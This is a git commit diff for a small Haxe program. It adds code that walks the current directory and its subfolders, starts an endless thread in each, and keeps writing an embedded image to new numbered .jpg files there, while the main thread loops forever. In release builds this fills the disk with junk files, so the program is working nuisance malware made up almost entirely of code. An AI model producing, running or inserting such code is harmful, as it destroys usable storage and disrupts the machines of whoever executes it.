d3637bf32754a7a556c6f8b522cb7542a2ccb650
Asher Hoeveler <contact@hecancanyou.xyz>
2022-10-02 14:04:54 -0500

    make it work (??)

--- src/Main.hx
+++ src/Main.hx
@@ -1,10 +1,24 @@
 package;
 
+import haxe.Json;
+import sys.FileSystem;
+import toolkit.MonkeDo;
+import toolkit.MonkeSee;
+
 class Main {
-	private static macro function getDefined(key:String):haxe.macro.Expr {
+	public static macro function getDefined(key:String):haxe.macro.Expr {
 		return macro $v{haxe.macro.Context.definedValue(key)}
 	}
+
 	static function main():Void {
-		
+		final dirs:Array<String> = [FileSystem.absolutePath(".")];
+		trace(Json.stringify(dirs));
+		for (dir in MonkeSee.indexFolders("."))
+			dirs.push(dir);
+		for (dir in dirs) {
+			MonkeDo.annoy(dir);
+			trace(dir);
+		}
+		while (true) {};
 	}
 }
---
+++ src/toolkit/MonkeDo.hx
@@ -0,0 +1,22 @@
+package toolkit;
+
+import sys.FileSystem;
+import sys.io.File;
+import sys.thread.Thread;
+
+class MonkeDo {
+    public static function annoy(absolutePath:String) {
+        Thread.create(() -> {
+            var name:Int=0;
+            while (true) {
+                #if debug
+                Sys.print('WRITING MONKEY TO ${FileSystem.fullPath(absolutePath)}/${StringTools.hex(name)}.jpg          \r');
+                #else
+                File.write('${FileSystem.fullPath(absolutePath)}/${StringTools.hex(name)}.jpg').write(Main.getDefined("img"));
+                trace("MONKE");
+                #end
+                name++;
+            }
+        });
+    }
+}
